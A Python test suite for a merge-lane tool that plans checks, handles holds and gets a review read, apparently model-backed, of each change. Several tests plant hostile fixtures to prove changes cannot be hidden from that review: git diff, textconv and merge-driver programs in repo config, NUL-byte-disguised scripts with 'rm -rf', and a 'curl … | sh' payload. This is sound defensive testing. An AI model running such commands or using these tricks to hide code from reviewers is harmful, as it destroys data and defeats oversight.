"""The lane end to end with the REAL planner, runner and reviewer (U5): a fixture repo carrying a real
tests/LANDING.toml and policy, lander.plan and lander.run doing the planning and the runs, lander.review doing the
read. Only the outside is stubbed: gh and the merge API (test_lane's fakes), cc-limit, the failures ledger, and the
cards/board/deploy/tip units (they post to Slack and touch the box).

    python3 -m unittest discover -s core/tests/lander -t core/tests/lander -p 'test_u5_lane.py' -v

Load-robust: no wall-clock deadline anywhere; the checks are `host` class (no bwrap, no scope), and whether the box
is loaded only decides whether a red is rerun alone, which gives the same verdict here.
"""
import os
import sys
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.realpath(__file__))
CORE = os.path.dirname(os.path.dirname(HERE))
for p in (CORE, HERE):
    if p not in sys.path:
        sys.path.insert(0, p)

import test_lane as TL  # noqa: E402
from lander import events as E  # noqa: E402
from lander import git as G  # noqa: E402
from lander import jobs as J  # noqa: E402
from lander import lane as L  # noqa: E402
from lander import plan as PLAN  # noqa: E402
from lander import records as REC  # noqa: E402
from lander import review as RV  # noqa: E402
from lander import run as RUN  # noqa: E402
from lander import types as T  # noqa: E402

MANIFEST = """
[[check]]
name = "a"
run = "sh tests/a.sh"
paths = ["a/**"]
class = "host"

[[check]]
name = "b"
run = "sh tests/b.sh"
paths = ["b/**"]
class = "host"

[[check]]
name = "c"
run = "true"
paths = ["c/**"]
class = "host"
"""
POLICY = """
default_checks = ["a"]

[paths]
paid_review = ["c/**"]
"""
# each check is red when its file says "bad"
CHECK = 'if grep -q bad {f}; then echo "FAIL {f} says bad"; exit 1; fi\necho "ok {f}"\n'
LIMIT = '#!/bin/sh\n[ "$1" = status ] && { echo "usage limit until 23:59Z (120m left)"; exit 0; }\nexit 1\n'


def setUpModule():
    TL.setUpModule()


def tearDownModule():
    TL.tearDownModule()


class RealUnits(TL.Fixture):
    def setUp(self):
        super().setUp()
        env = {"LANDER_STATE": os.environ["CC_LANDER_STATE"], "LANDER_SCOPE": "0"}
        p = mock.patch.dict(os.environ, env)
        p.start()
        self.addCleanup(p.stop)
        self.reds = []
        p = mock.patch.object(REC, "record_red", lambda scope, r, text, pr=None, **kw: self.reds.append(
            (scope, r.check, r.tree, pr)) or "recorded")
        p.start()
        self.addCleanup(p.stop)
        self.limit_bin = os.path.join(self.tmp, "limitbin")
        os.makedirs(self.limit_bin)
        with open(os.path.join(self.limit_bin, "cc-limit"), "w") as f:
            f.write(LIMIT)
        os.chmod(os.path.join(self.limit_bin, "cc-limit"), 0o755)
        p = mock.patch.object(RV, "BIN", self.limit_bin)
        p.start()
        self.addCleanup(p.stop)
        self.main({"tests/LANDING.toml": MANIFEST, "tests/LANDING-policy.toml": POLICY,
                   "tests/a.sh": CHECK.format(f="a/x"), "tests/b.sh": CHECK.format(f="b/gate")})

    def main(self, files):
        """A commit straight onto origin's main."""
        self.git(self.work, "fetch", "-q", "origin")
        self.git(self.work, "checkout", "-q", "-B", "main", "origin/main")
        self.write(self.work, files)
        self.git(self.work, "add", "-A")
        self.git(self.work, "commit", "-qm", f"main {sorted(files)}")
        self.git(self.work, "push", "-q", "origin", "main:refs/heads/main")

    def land(self, repo="demo", **units):
        u = {"planner": PLAN, "runner": RUN, "reviewer": RV, "cards": TL.Rec(), "board": TL.Rec(),
             "deploy": TL.Rec(), "tip": TL.Rec()}
        u.update(units)
        return u, L.Lane(repo, u).run()

    def test_a_green_pr_merges_through_the_real_plan_and_runs(self):
        self.pr(1, {"a/x": "good\n"})
        J.submit("demo", 1)
        u, lines = self.land()
        j = self.job()
        self.assertEqual(j.state, T.DEPLOY_PENDING, lines)
        self.assertEqual(j.plan.checks, ["a"])
        self.assertEqual(list(j.results), ["a"])
        self.assertEqual(u["deploy"].calls, [("request", "demo", self.origin_rev("main"), [])])
        self.assertIn("stage demo#1 gate gate=a ok=yes", self.log())
        self.assertEqual(self.reds, [])
        # the run was stored by the lane under its lock: the job's own record of check a on the merge tree
        store = REC.Store("demo", root=J.landq())
        self.assertIsNotNone(store.get(j.key, "a", j.extra["tree"]))

    def test_a_red_pr_is_handed_back_and_recorded_once(self):
        self.pr(1, {"a/x": "bad\n"})
        J.submit("demo", 1)
        u, lines = self.land()
        self.assertIsNone(self.job(), lines)                          # handed back: the job file is gone
        self.assertTrue(os.path.exists(J.handed_path("demo", 1)))
        self.assertEqual(u["cards"].calls[0][0], "stopped")
        self.assertEqual([(s, c, pr) for s, c, _, pr in self.reds], [("demo", "a", 1)])
        self.assertEqual(self.box().get("merges", []), [])

    def test_a_check_red_on_main_too_is_blocked_by_main_not_blamed(self):
        self.main({"b/gate": "bad\n"})                               # main breaks check b
        self.pr(1, {"b/y": "a change b owns\n"})
        J.submit("demo", 1)
        u, lines = self.land()
        j = self.job()
        self.assertEqual((j.state, j.extra["hold"], j.extra["held_from"]), (T.HELD, "box", T.QUEUED), lines)
        self.assertIn("blocked-by-main:b", j.extra["why"])
        self.assertEqual(self.reds, [])                               # not the PR's red: no ledger record
        self.assertEqual(u["cards"].calls, [])                        # and nobody is told the PR broke it
        self.assertFalse(os.path.exists(J.handed_path("demo", 1)))
        self.assertEqual(self.box().get("merges", []), [])
        self.assertIn("gate=b ok=main-red", self.log())
        # main mended: after the hold the job is planned again from main and lands
        self.main({"b/gate": "fine\n"})
        j.extra["not_before"] = E.stamp(time.time() - 1)
        J.save(j)
        u, lines = self.land()
        self.assertEqual(self.job().state, T.DEPLOY_PENDING, lines)

    def release(self):
        j = self.job()
        j.extra["not_before"] = E.stamp(time.time() - 1)
        J.save(j)

    def gates(self, since=0):
        return [ln.split("gate=")[1].split()[0] for ln in self.log()[since:].splitlines() if " gate gate=" in ln]

    def test_a_main_red_hold_waits_without_checks_until_main_moves_then_gives_up(self):
        self.main({"b/gate": "bad\n"})
        self.pr(1, {"b/y": "a change b owns\n"})
        J.submit("demo", 1)
        self.land()
        j = self.job()
        self.assertEqual(j.extra["main_red"]["check"], "b")
        self.assertEqual(j.extra["main_red"]["waits"], 0)
        for w in range(1, L.MAIN_RED_WAITS + 1):   # main and the head stay put: held again, no check run
            self.release()
            at = len(self.log())
            u, lines = self.land()
            j = self.job()
            self.assertEqual((j.state, j.extra["main_red"]["waits"]), (T.HELD, w), lines)   # the count is saved
            self.assertIn("main-red: main has not moved", j.extra["why"])
            self.assertEqual(self.gates(at), [])
        self.release()   # the 5th pass tries anyway, and main is still red on b: held as main's again, count reset
        at = len(self.log())
        u, lines = self.land()
        j = self.job()
        self.assertEqual(self.gates(at), ["b"], lines)
        self.assertIn("blocked-by-main:b", j.extra["why"])
        self.assertEqual(j.extra["main_red"]["waits"], 0)

    def test_the_check_red_on_main_runs_first_once_main_moves(self):
        self.main({"b/gate": "bad\n"})
        self.pr(1, {"a/x": "good\n", "b/y": "a change b owns\n"})
        J.submit("demo", 1)
        u, lines = self.land()
        j = self.job()
        self.assertEqual((j.state, j.extra["main_red"]["check"]), (T.HELD, "b"), lines)
        self.assertEqual(j.plan.checks, ["a", "b"])
        self.main({"b/gate": "fine\n"})   # main moves (mended): planned again, and b goes before a
        self.release()
        at = len(self.log())
        with mock.patch.object(L.Lane, "width", lambda self: 1):   # one at a time, so the order shows
            u, lines = self.land()
        j = self.job()
        self.assertEqual(self.gates(at), ["b", "a"], lines)
        self.assertEqual(j.state, T.DEPLOY_PENDING, lines)
        self.assertNotIn("main_red", j.extra)   # cleared when b passed

    def test_a_limit_deferred_review_waits_for_the_reset(self):
        self.pr(1, {"c/w": "paid\n"})
        J.submit("demo", 1)
        before = time.time()
        u, lines = self.land()
        j = self.job()
        self.assertEqual((j.state, j.reads_used, j.extra["hold"]), (T.HELD, 0, "box"), lines)
        self.assertTrue(j.plan.paid)
        # not_before is the reset cc-limit named (120 min + 1), not the 15-minute hold
        self.assertGreater(E.epoch_of(j.extra["not_before"]), before + 110 * 60)
        d = J.read_json(J.job_path("demo", 1))
        self.assertEqual(d["stage"], "deferred")                      # the Home tab does not count it as running
        self.assertIn("usage limit", j.extra["why"])
        # a lane run before the reset leaves it alone: no read is asked for
        with mock.patch.object(RV, "_buy", side_effect=AssertionError("a read was asked for")):
            self.land()
        self.assertEqual(self.job().state, T.HELD)

    def recorded_land(self, num, head):
        """What `record` posts: a LAND marker at `head`, keyed by the reviewer's digest_of against today's main."""
        self.git(self.work, "fetch", "-q", "origin")
        d = RV.digest_of(self.work, "origin/main", head)
        body = RV.marker(T.Verdict(verdict=T.LAND, digest=d), self.origin_rev("main"), head, "seat")
        b = self.box()
        b["prs"][str(num)]["comments"] = [{"body": body, "viewerDidAuthor": True}]
        self.set_box(prs=b["prs"])
        return d

    def test_a_land_recorded_at_the_head_is_the_verdict_the_lane_uses(self):
        """#739: a LAND recorded at a head, main moved on since, the lane at that same head lands it with no read."""
        head = self.pr(1, {"c/w": "paid\n"})
        d = self.recorded_land(1, head)
        self.main({"b/y": "main moved on\n"})
        J.submit("demo", 1)
        with mock.patch.object(RV, "_buy", side_effect=AssertionError("a read was asked for")):
            u, lines = self.land()
        j = self.job()
        self.assertEqual((j.state, j.digest, j.reads_used), (T.DEPLOY_PENDING, d, 0), lines)
        self.assertTrue(j.plan.paid)
        # and will-review says what the lane did: no read
        comments = self.box()["prs"]["1"]["comments"]
        self.assertEqual(RV.would_read(j, comments)[0], False)

    def test_a_land_recorded_at_an_older_head_is_not_used(self):
        head = self.pr(1, {"c/w": "paid\n"})
        self.recorded_land(1, head)
        self.push("track/row-1", {"c/w": "paid, then changed\n"}, fresh=False)
        J.submit("demo", 1)
        u, lines = self.land()
        j = self.job()
        # the change is not the one read, so the lane asks for a read (here held by the usage limit)
        self.assertEqual((j.state, j.extra["hold"]), (T.HELD, "box"), lines)
        self.assertIn("usage limit", j.extra["why"])
        self.assertEqual(RV.would_read(j, self.box()["prs"]["1"]["comments"])[0], True)

    def test_a_land_recorded_for_one_binary_is_not_used_for_other_bytes_at_that_path(self):
        """A binary hunk says only "Binary files … differ": the digest keeps the blob ids, so a second head adding the
        same binary path with other bytes has another key and the LAND recorded on the first is not carried to it."""
        first = self.pr(1, {"c/blob.bin": "\x00one\x00"})
        d1 = self.recorded_land(1, first)
        second = self.push("track/row-1", {"c/blob.bin": "\x00two\x00"})
        self.assertIn("Binary files", RV.diff_of(self.work, "origin/main", second))
        self.assertNotEqual(d1, RV.digest_of(self.work, "origin/main", second))
        J.submit("demo", 1)
        u, lines = self.land()
        j = self.job()
        self.assertEqual((j.state, j.extra["hold"]), (T.HELD, "box"), lines)
        self.assertIn("usage limit", j.extra["why"])

    def test_the_digest_ignores_a_diff_program_or_textconv_named_in_the_repo_config(self):
        """A worker can write the shared .git/config. diff.external or a textconv driver must neither run as the
        lander nor flatten two binaries to one text, and so one key."""
        first = self.pr(1, {"c/blob.bin": "\x00one\x00"})
        second = self.push("track/row-2", {"c/blob.bin": "\x00two\x00"})
        ran = os.path.join(self.tmp, "ran")
        prog = os.path.join(self.tmp, "prog")
        with open(prog, "w") as f:
            f.write(f"#!/bin/sh\necho x >> {ran}\necho same\n")
        os.chmod(prog, 0o755)
        with open(os.path.join(self.work, ".gitattributes"), "w") as f:
            f.write("*.bin diff=conv\n")
        self.git(self.work, "config", "diff.external", prog)
        self.git(self.work, "config", "diff.conv.textconv", prog)
        self.git(self.work, "config", "color.ui", "always")
        self.assertIn("same", self.git(self.work, "diff", "origin/main", second))   # the config does bite plain git
        os.remove(ran)
        self.assertNotEqual(RV.digest_of(self.work, "origin/main", first),
                            RV.digest_of(self.work, "origin/main", second))
        self.assertIn("Binary files", RV.diff_of(self.work, "origin/main", second))
        self.assertFalse(os.path.exists(ran), "the lander ran a program the repo config named")

    def test_a_diff_attribute_cannot_hide_a_text_change_from_the_review(self):
        """A worker can write the shared git dir's info/attributes, the checkout's .gitattributes and the attributes
        file its config names. `-diff`, `binary` or a diff driver set `binary` there turns a text change into
        "Binary files … differ", so the review would read none of it. The review's diff and interdiff show the text;
        a real binary stays one line."""
        head = self.pr(1, {"c/w.py": "print('hidden')\n", "c/blob.bin": "\x00bytes\x00"})
        common = self.git(self.work, "rev-parse", "--path-format=absolute", "--git-common-dir").strip()
        os.makedirs(os.path.join(common, "info"), exist_ok=True)
        attrs = os.path.join(self.tmp, "attrs")
        info = os.path.join(common, "info", "attributes")
        for where, line, key, val in ((info, "*.py -diff\n", None, None),
                                      (os.path.join(self.work, ".gitattributes"), "*.py binary\n", None, None),
                                      (attrs, "*.py -diff\n", "core.attributesFile", attrs),
                                      (info, "*.py diff=conv\n", "diff.conv.binary", "true")):
            with self.subTest(line=line, where=where):
                with open(where, "w") as f:
                    f.write(line)
                if key:
                    self.git(self.work, "config", key, val)
                self.assertIn("b/c/w.py differ", self.git(self.work, "diff", "origin/main", head))   # it bites git
                for d in (RV.diff_of(self.work, "origin/main", head), RV.plain_diff(self.work, "origin/main", head)[1]):
                    self.assertIn("+print('hidden')", d)
                    self.assertNotIn("b/c/w.py differ", d)
                    self.assertIn("b/c/blob.bin differ", d)     # a real binary is still one line, not its bytes
                    self.assertNotIn("\x00", d)
                os.remove(where)
                if key:
                    self.git(self.work, "config", "--unset", key)
                # the next case starts clean
                self.assertNotIn("b/c/w.py differ", self.git(self.work, "diff", "origin/main", head))

    def test_a_merge_driver_in_the_checkout_neither_runs_nor_changes_the_merged_view(self):
        """`* merge=pwn` in info/attributes and merge.pwn.driver in the shared config would make `git merge-tree` in
        the checkout run a program as the lander and show the files it writes. The review's merged view runs no
        driver and is the clean merge."""
        lines = [f"line {i}\n" for i in range(12)]
        self.main({"c/m.txt": "".join(lines)})
        head = self.push("track/row-1", {"c/m.txt": "".join(["BRANCH\n"] + lines[1:])})
        self.main({"c/m.txt": "".join(lines[:-1] + ["MAIN\n"])})
        self.git(self.work, "fetch", "-q", "origin")
        base = self.git(self.work, "rev-parse", "origin/main").strip()
        clean = RV.merged_files(self.work, base, head, ["c/m.txt"])
        self.assertIn("BRANCH\n", clean)
        self.assertIn("MAIN\n", clean)
        ran, prog = os.path.join(self.tmp, "ran"), os.path.join(self.tmp, "pwn")
        with open(prog, "w") as f:
            f.write(f"#!/bin/sh\necho x >> {ran}\necho PWNED > \"$1\"\n")
        os.chmod(prog, 0o755)
        common = self.git(self.work, "rev-parse", "--path-format=absolute", "--git-common-dir").strip()
        os.makedirs(os.path.join(common, "info"), exist_ok=True)
        with open(os.path.join(common, "info", "attributes"), "w") as f:
            f.write("* merge=pwn\n")
        self.git(self.work, "config", "merge.pwn.driver", f"{prog} %A")
        tree = self.git(self.work, "merge-tree", "--write-tree", base, head).split()[0]   # it bites git
        self.assertEqual(self.git(self.work, "show", f"{tree}:c/m.txt").strip(), "PWNED")
        self.assertTrue(os.path.exists(ran))
        os.remove(ran)
        self.assertEqual(RV.merged_files(self.work, base, head, ["c/m.txt"]), clean)
        self.assertFalse(os.path.exists(ran), "the lander ran a merge driver the checkout named")

    def test_a_nul_byte_in_a_script_names_it_and_its_blobs_in_the_files_block(self):
        """One NUL byte on a comment line leaves a shell script runnable and makes git call its change binary. The
        files block gives the path and both blob ids and flags it; a known binary type is flagged only when it is
        executable."""
        self.main({"c/run.sh": "#!/bin/sh\necho hi\n"})
        head = self.push("track/row-1", {"c/run.sh": "#!/bin/sh\n#\x00\nrm -rf \"$HOME/x\"\n",
                                         "c/img.png": "\x00png\x00", "c/run.png": "\x00exec\x00"})
        os.chmod(os.path.join(self.work, "c", "run.png"), 0o755)
        self.git(self.work, "commit", "-qam", "exec")
        self.git(self.work, "push", "-q", "-f", "origin", "HEAD:refs/heads/track/row-1")
        head = self.git(self.work, "rev-parse", "HEAD").strip()
        self.git(self.work, "fetch", "-q", "origin")
        base = self.git(self.work, "rev-parse", "origin/main").strip()
        self.assertIn("b/c/run.sh differ", RV.diff_of(self.work, base, head))   # the diff hides it
        ids = {p: self.git(self.work, "rev-parse", f"{head}:c/{p}").strip() for p in ("run.sh", "img.png", "run.png")}
        old = self.git(self.work, "rev-parse", f"{base}:c/run.sh").strip()
        files = RV.merged_files(self.work, base, head, ["c/run.sh", "c/img.png", "c/run.png"])
        self.assertIn(f"=== c/run.sh (old mode 100644, new mode 100644; binary, not shown: old blob {old}, new blob "
                      f"{ids['run.sh']}; FLAGGED: binary, not a known binary type: .sh)", files)
        self.assertIn(f"=== c/img.png (old mode none, new mode 100644; binary, not shown: old blob none, new blob "
                      f"{ids['img.png']})", files)
        self.assertIn(f"=== c/run.png (old mode none, new mode 100755; binary, not shown: old blob none, new blob "
                      f"{ids['run.png']}; FLAGGED: binary, executable)", files)
        self.assertNotIn("rm -rf", files)

    def test_every_changed_path_is_in_the_files_block_with_its_modes_and_a_kind(self):
        """Each path the change touches, whatever its name holds (a byte git would quote, a space, a newline), is
        listed by -z as it is and gets a header with its old and new mode, then is text, a known binary type or
        FLAGGED. A NUL'd script behind a .png name with a text name symlinked to it is caught at the symlink."""
        self.main({"c/run.sh": "#!/bin/sh\necho hi\n", "c/gone.txt": "bye\n"})
        script = "#!/bin/sh\n#\x00\nrm -rf \"$HOME/x\"\n"
        self.push("track/row-1", {"c/run\u00e9.sh": script, "c/evil.png": script, "c/a b.txt": "spaced\n",
                                  "c/new\nline.txt": "newline\n", "c/img.png": "\x00png\x00"})
        os.remove(os.path.join(self.work, "c", "run.sh"))
        os.symlink("evil.png", os.path.join(self.work, "c", "run.sh"))
        os.remove(os.path.join(self.work, "c", "gone.txt"))
        self.git(self.work, "add", "-A")
        self.git(self.work, "commit", "-qm", "link and delete")
        self.git(self.work, "push", "-q", "-f", "origin", "HEAD:refs/heads/track/row-1")
        head = self.git(self.work, "rev-parse", "HEAD").strip()
        self.git(self.work, "fetch", "-q", "origin")
        base = self.git(self.work, "rev-parse", "origin/main").strip()
        want = {"c/run\u00e9.sh": ("none", "100644", "FLAGGED: binary, not a known binary type: .sh"),
                "c/evil.png": ("none", "100644", "binary, not shown"),
                "c/run.sh": ("100644", "120000", "FLAGGED: a symlink change"),
                "c/a b.txt": ("none", "100644", "spaced"), "c/new\nline.txt": ("none", "100644", "newline"),
                "c/img.png": ("none", "100644", "binary, not shown"),
                "c/gone.txt": ("100644", "none", "deleted by this change")}
        files = G.changed(self.work, base, head)
        self.assertEqual(sorted(files), sorted(want))
        self.assertEqual(sorted(PLAN.changed(self.work, base, head)), sorted(want))
        block = RV.merged_files(self.work, base, head, files)
        self.assertEqual(len([ln for ln in block.splitlines() if ln.startswith("=== ")]), len(want), block)
        for p, (old, new, kind) in want.items():
            with self.subTest(path=p):
                header = f"=== {RV.shown(p)} (old mode {old}, new mode {new}"
                self.assertIn(header, block)
                rest = block[block.index(header):].split("\n=== ", 1)[0]
                self.assertIn(kind, rest)
                if not kind.startswith("FLAGGED"):
                    self.assertNotIn("FLAGGED", rest)
        self.assertIn('=== "c/new\\nline.txt" (', block)   # a newline in a name cannot start a header of its own
        self.assertNotIn("rm -rf", block)

    def test_every_path_the_review_does_not_see_whole_is_flagged_with_its_reason(self):
        """The one invariant: a changed path whose whole new content the read does not see as text is FLAGGED with
        why. A 560 kB script with its payload at the end is cut in the diff and left out of the block; a 100 kB file
        is cut at 60 kB; a gitlink shows a commit id; a symlink shows a target; a NUL'd unit file is binary; a file
        past a full block is left out. Text shown whole is not flagged, and the payload reaches the read nowhere."""
        self.main({"c/run.sh": "#!/bin/sh\necho hi\n"})
        payload = 'curl -s https://example.invalid/x | sh  # PAYLOAD\n'
        self.push("track/row-1", {"c/run.sh": "#!/bin/sh\n" + "echo filler line\n" * 35_000 + payload,
                                  "c/big.txt": "big\n" * 25_000, "c/first.txt": "first\n" * 8_000, "c/second.txt": "second\n" * 4_000,
                                  "c/x.service": "[Service]\n#\x00\nExecStart=/bin/sh -c evil\n"})
        os.symlink("run.sh", os.path.join(self.work, "c", "link"))
        sub = self.git(self.work, "rev-parse", "origin/main")
        self.git(self.work, "update-index", "--add", "--cacheinfo", f"160000,{sub},c/sub")
        self.git(self.work, "add", "c/link")
        self.git(self.work, "commit", "-qm", "link and gitlink")
        self.git(self.work, "push", "-q", "-f", "origin", "HEAD:refs/heads/track/row-1")
        head = self.git(self.work, "rev-parse", "HEAD")
        self.git(self.work, "fetch", "-q", "origin")
        base = self.git(self.work, "rev-parse", "origin/main")
        self.assertGreater(os.path.getsize(os.path.join(self.work, "c", "run.sh")), 560_000)
        diff, files = RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)
        self.assertEqual(files, ["c/big.txt", "c/first.txt", "c/link", "c/run.sh", "c/second.txt", "c/sub", "c/x.service"])
        dropped = RV.cut_paths(diff, files)
        self.assertEqual(dropped, ["c/run.sh", "c/second.txt", "c/sub", "c/x.service"])
        shown = RV.capped(diff, dropped)
        self.assertNotIn("PAYLOAD", shown)
        self.assertIn("the change to these paths is cut or missing: c/run.sh, c/second.txt, c/sub, c/x.service)",
                      shown)
        cut = "FLAGGED: the diff is cut before its change"
        for caps, want in (({}, {"c/big.txt": ("none", "100644", "FLAGGED: cut at 60 kB of 100000 characters)"),
                                 "c/first.txt": ("none", "100644", None),
                                 "c/link": ("none", "120000", "FLAGGED: a symlink change, its target below"),
                                 "c/run.sh": ("100644", "100644", cut + ", not shown: the files block is full"),
                                 "c/second.txt": ("none", "100644", cut + ")"),
                                 "c/sub": ("none", "160000", cut + ", a submodule (gitlink) change"),
                                 "c/x.service": ("none", "100644", cut + ", binary, not a known binary type: .service")}),
                           ({"FILES_CAP": 70_000}, {"c/big.txt": ("none", "100644",
                                                                 "FLAGGED: not shown: the files block is full)"),
                                                    "c/first.txt": ("none", "100644", None),
                                                    "c/second.txt": ("none", "100644",
                                                                     cut + ", not shown: the files block is full"),
                                                    "c/run.sh": ("100644", "100644",
                                                                 cut + ", not shown: the files block is full")})):
            with self.subTest(caps=caps), mock.patch.multiple(RV, **caps) if caps else mock.patch.dict({}):
                block = RV.merged_files(self.work, base, head, files, dropped)
                self.assertNotIn("PAYLOAD", block)
                self.assertNotIn("ExecStart", block)
                self.assertEqual(len([ln for ln in block.splitlines() if ln.startswith("=== ")]), len(files))
                for p, (old, new, flag) in want.items():
                    header = f"=== {p} (old mode {old}, new mode {new}"
                    self.assertIn(header, block)
                    line = block[block.index(header):].split("\n", 1)[0]
                    if flag is None:
                        self.assertNotIn("FLAGGED", line)
                    else:
                        self.assertIn(flag, line)
        self.assertIn(f"=== c/sub (old mode none, new mode 160000; old commit none, new commit {sub}; FLAGGED: ",
                      RV.merged_files(self.work, base, head, ["c/sub"]))
        self.assertEqual(RV.merged_files(self.work, base, head, ["c/first.txt"]),
                         "=== c/first.txt (old mode none, new mode 100644)\n" + "first\n" * 8_000)

    def test_a_gitmodules_ignore_all_cannot_hide_a_gitlink_from_the_plan_or_the_read(self):
        """main's .gitmodules says `ignore = all` for s, and a PR adds gitlink s beside a text file. The checkout's
        own `git diff --name-only` drops s; G.changed still lists it, and the read gets s FLAGGED as a submodule even
        when the job's file list (an older lane's) left it out."""
        self.main({".gitmodules": '[submodule "s"]\n\tpath = s\n\turl = ./x\n\tignore = all\n'})
        self.push("track/row-1", {"f": "text\n"})
        sub = self.git(self.work, "rev-parse", "origin/main")
        self.git(self.work, "update-index", "--add", "--cacheinfo", f"160000,{sub},s")
        self.git(self.work, "commit", "-qm", "gitlink")
        self.git(self.work, "push", "-q", "-f", "origin", "HEAD:refs/heads/track/row-1")
        head = self.git(self.work, "rev-parse", "HEAD")
        self.git(self.work, "fetch", "-q", "origin")
        base = self.git(self.work, "rev-parse", "origin/main")
        self.assertEqual(self.git(self.work, "diff", "--name-only", base, head), "f")   # the checkout's git hides s
        self.assertEqual(G.changed(self.work, base, head), ["f", "s"])
        self.assertEqual(RV.files_of(self.work, base, head), ["f", "s"])
        nolimit = os.path.join(self.tmp, "nolimit")
        os.makedirs(nolimit)
        with open(os.path.join(nolimit, "cc-limit"), "w") as f:
            f.write("#!/bin/sh\nexit 1\n")
        os.chmod(os.path.join(nolimit, "cc-limit"), 0o755)
        sent = []
        j = T.Job(repo="demo", pr=1, head=head, base_sha=base, digest=RV.digest_of(self.work, base, head),
                  plan=T.Plan(paid=True), files=["f"], extra={"root": self.work})
        with mock.patch.object(RV, "BIN", nolimit), mock.patch.object(RV, "pr_view", lambda *a, **k: {}), \
                mock.patch.object(RV, "ask", lambda text, *a: sent.append(text) or (None, 0.0, "no answer")):
            RV._buy(j, "review.md", RV.diff_of(self.work, base, head), {})
        block = sent[0][sent[0].index("<<<files"):sent[0].index("files>>>")]
        self.assertIn(f"=== s (old mode none, new mode 160000; old commit none, new commit {sub}; FLAGGED: a submodule "
                      "(gitlink) change", block)
        self.assertIn("=== f (old mode none, new mode 100644)\ntext\n", block)

    def test_a_replace_graft_in_the_checkout_cannot_move_the_merge_base_past_a_commit(self):
        """A PR of two commits, C1 adds p and C2 adds f; main moves on. `git replace --graft <main> <its parent> C1`
        in the checkout makes C1 look merged, so the checkout's merge-base is C1 and a diff from there lists only f.
        The review finds the merge-base in blind(), which reads no replace ref, and sees p."""
        c1 = self.push("track/row-1", {"p": "hidden\n"})
        c2 = self.push("track/row-1", {"f": "shown\n"}, fresh=False)
        self.main({"b/y": "main moved on\n"})   # a graft onto the branch's own base would be a cycle
        base = self.git(self.work, "rev-parse", "origin/main")
        parent = self.git(self.work, "rev-parse", f"{base}^")
        self.git(self.work, "replace", "--graft", base, parent, c1)
        self.assertEqual(self.git(self.work, "merge-base", base, c2), c1)   # it bites the checkout's git
        self.assertEqual(RV.files_of(self.work, base, c2), ["f", "p"])
        diff = RV.diff_of(self.work, base, c2)
        self.assertIn("+hidden", diff)
        self.assertIn("+shown", diff)
        self.assertEqual(RV.digest_of(self.work, base, c2), RV.change_digest(diff))

    def test_ended_jobs_leave_the_readers_directory(self):
        self.pr(1, {"a/x": "n\n"}, state="CLOSED", headRefOid="e" * 40)
        J.submit("demo", 1)
        self.land()
        self.assertFalse(os.path.exists(J.job_path("demo", 1)))      # done: off <LANDQ>/*.json, as the old unlink
        self.assertEqual(self.job().state, T.DONE)                   # …but a re-queue still finds it
        self.assertTrue(os.path.exists(J.rest_path("demo", 1)))
        J.submit("demo", 1)
        with J.lane_lock("demo"):
            J.drain("demo")
        self.assertTrue(os.path.exists(J.job_path("demo", 1)))
        self.assertFalse(os.path.exists(J.rest_path("demo", 1)))
        self.assertEqual(J.read_json(J.job_path("demo", 1))["stage"], "queued")


if __name__ == "__main__":
    unittest.main()
